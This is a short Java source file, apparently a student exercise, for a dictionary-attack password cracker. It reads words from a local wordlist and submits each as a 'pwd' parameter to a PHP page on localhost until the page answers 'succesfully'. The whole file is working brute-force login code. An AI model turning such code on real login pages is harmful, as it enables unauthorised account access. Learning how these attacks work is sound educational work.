import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Scanner;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class Dictionnaire implements Attack {

    String s;

    public Dictionnaire() {}

    public String passwordCracker() throws Exception {
        InputStream document = new FileInputStream("/home/cheeks/Bureau/DIC1/Programmation/Programmes Vs Code/Java/forceBrute/dictionnaire.txt");
        long beggining = System.currentTimeMillis();
        try (Scanner currentWord = new Scanner(document)) {
            while (currentWord.hasNextLine()) {
                String pswd = currentWord.next();
                URL url = new URL("http://localhost:8080/MesProjets/UserPage.php?pwd=" + pswd);
                URLConnection connection = url.openConnection();

                try (BufferedReader in = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {

                        System.out.println(line);
                        if(line.equals("succesfully")) {
                            System.out.println("Welcome Saliou Samba Diao you are at your secret page for administrating the DataBases");
                            long end = System.currentTimeMillis();
                            long executionTime = (end - beggining) / 1000;
                            System.out.println("The execution time is : " + executionTime + " seconds");
                            System.exit(0);
                        }
                    }
                }
            }
            currentWord.close();
        }
        return s;
    }
}
